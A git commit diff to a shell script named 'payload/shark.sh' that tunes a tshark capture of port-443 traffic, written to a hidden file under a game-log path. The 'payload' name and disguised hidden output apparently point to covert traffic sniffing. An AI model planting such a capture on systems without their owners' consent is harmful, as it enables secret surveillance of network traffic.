71476b0f37ce36e81181e809aba88b15d5a52bc8
MiloCS <miloccs@gmail.com>
2021-04-25 17:17:09 -0400

    update to tshark command

--- payload/shark.sh
+++ payload/shark.sh
@@ -1,1 +1,1 @@
-tshark -i $(python selectinterface.py) -f "tcp port 443" -w /var/log/gamelog/.gamelog
+tshark -i $(python selectinterface.py) -f "tcp port 443" -w /var/log/gamelog/.gamelog -b duration:5000
